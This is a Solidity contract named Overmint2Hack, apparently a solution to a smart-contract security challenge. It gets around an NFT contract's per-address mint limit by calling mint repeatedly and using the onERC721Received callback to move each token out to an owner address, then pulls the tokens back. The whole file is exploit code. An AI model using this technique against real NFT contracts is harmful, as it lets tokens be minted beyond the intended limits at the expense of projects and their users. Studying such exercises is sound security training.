// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

interface IMint is IERC721 {
    function mint() external;

    function success() external view returns (bool);
}

contract Overmint2Hack {
    IMint public immutable nftContract;
    address public immutable ownerAddress;

    uint256[] public tokenIdsMinted;

    constructor(address _addressToHack, address _ownerAddress) {
        nftContract = IMint(_addressToHack);
        ownerAddress = _ownerAddress;
    }

    function hackMint() external {
        for (uint256 i = 0; i < 5; i++) {
            nftContract.mint();
        }
        for (uint256 i = 0; i < tokenIdsMinted.length; i++) {
            nftContract.transferFrom(
                ownerAddress,
                address(this),
                tokenIdsMinted[i]
            );
        }
        require(nftContract.success(), "No success");
    }

    /**
     * @dev See {IERC721Receiver-onERC721Received}.
     */
    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        nftContract.transferFrom(address(this), ownerAddress, tokenId);
        tokenIdsMinted.push(tokenId);
        return
            bytes4(
                keccak256("onERC721Received(address,address,uint256,bytes)")
            );
    }
}
